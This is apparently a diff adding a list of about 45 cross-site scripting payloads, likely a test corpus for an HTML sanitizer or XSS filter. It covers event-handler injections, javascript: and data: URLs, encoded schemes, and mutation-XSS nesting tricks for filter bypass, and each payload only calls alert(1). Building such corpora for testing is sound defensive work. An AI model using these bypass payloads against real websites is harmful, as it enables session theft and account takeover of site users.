@@ -1,0 +1,45 @@
+"><svg onload=alert(1)>
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
+<iframe src=javascript:alert(1)>
+<math><mtext></form><form><mglyph><svg><mtext><textarea><a title="</textarea><img src=x onerror=alert(1)>">
+<x onclick="alert(1)" style="color:red">click
+<script src=data:text/javascript,alert(1)></script>
+<style>@import 'javascript:alert(1)';</style>
+<div style=background:url(javascript:alert(1))>x</div>
+<a href="javascript&colon;alert(1)">x</a>
+<form><button formaction=javascript:alert(1)>x
+<input onfocus=alert(1) autofocus>
+<object data="data:text/html,<script>alert(1)</script>">
+<embed src="javascript:alert(1)">
+<base href="javascript:alert(1)//">
+<video><source onerror="alert(1)">
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>x</marquee>
+<isindex action=javascript:alert(1) type=image>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set attributeName=onmouseover to=alert(1)>
+<body onload=alert(1)>
+<select autofocus onfocus=alert(1)><option>x
+<keygen autofocus onfocus=alert(1)>
+<table background="javascript:alert(1)">
+<link rel=stylesheet href="javascript:alert(1)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+plaintext<script>alert(1)</script>
+<svg><script>&#97;lert(1)</script>
+<img src=x:alert(1) onerror=eval(src)>
+<svg><discard onbegin=alert(1)>
+<xss id=x tabindex=1 onactivate=alert(1)></xss>
+<style>*{x:expression(alert(1))}</style>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<template><script>alert(1)</script></template>
+<noembed><img src=x onerror=alert(1)></noembed>
+<a href="&#106;&#97;vascript:alert(1)">x</a>
+<a href="jav&#x0A;ascript:alert(1)">x</a>
+"><script>alert(1)</script>
+<form id=test /><button form=test formaction=javascript:alert(1)>X
+<video autoplay onloadstart=alert(1) src=x>
+<audio src onloadstart=alert(1)>
+<font color="red" onmouseover=alert(1)>x</font>
+<style onload=alert(1)></style>
+<iframe srcdoc="<script>alert(1)</script>">
+<img src="x` `<script>alert(1)</script>"`>
